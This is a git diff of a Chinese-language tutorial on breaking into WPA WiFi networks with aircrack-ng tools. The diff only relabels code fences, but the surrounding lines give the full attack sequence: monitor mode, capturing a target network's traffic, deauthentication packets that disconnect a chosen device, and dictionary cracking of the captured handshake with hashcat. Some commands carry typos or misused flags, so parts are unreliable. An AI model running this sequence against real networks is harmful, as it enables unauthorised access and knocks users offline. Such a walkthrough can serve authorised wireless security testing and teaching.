@@ -2,19 +2,19 @@
 
 1. 查看網絡設備, 獲取無線網卡名稱.
 
-   ```bash
+   ```sh
    iwconfig
    ```
 
 2. 開啓無線網卡監聽模式.
 
-   ```bash
+   ```sh
    sudo airmon-ng start wlan0
    ```
 
    若设备被占用, 执行下列命令来结束占用设备的进程:  
 
-   ```bash
+   ```sh
    sudo airmon-ng check kill
    ```
 
@@ -25,7 +25,7 @@
 
 3. 監聽 WiFi 信號.
 
-   ```bash
+   ```sh
    sudo airodunp-ng wlan0mon
    ```
 
@@ -33,13 +33,13 @@
 
 4. 捕獲指定 WiFi 通信內容.
 
-   ```bash
+   ```sh
    sudo airodump-ng -w [.cap存檔名稱] -c [CH] --bssid [BSSID] wlan0mon
    ```
 
 5. 斷開指定設備與指定 WiFi 的鏈接.
 
-   ```bash
+   ```sh
    sudo aireplay-ng -0 5 -a [BSSID] -c [Target MAC] wlan0mon
    ```
 
@@ -53,19 +53,19 @@
 
    - 使用 Hashcat. (推薦)
 
-      ```bash
+      ```sh
       aircrack-ng [.cap存檔文件] -j [.haccpx文件]   # 將 .cap 文件轉爲 hashcat 接受的 .haccpx 文件
       hashcat -m 2500 -a 0 [.hccapx文件] [字典文件] # 利用 hashcat 進行破解
       ```
 
    - 使用 aircrack-ng.
 
-      ```bash
+      ```sh
       aircrack-ng -w [.cap存檔文件] [字典文件]
       ```
 
 8. 關閉無線網卡監聽模式.
 
-   ```bash
+   ```sh
    sudo airmon-ng stop wlan0mon
    ```
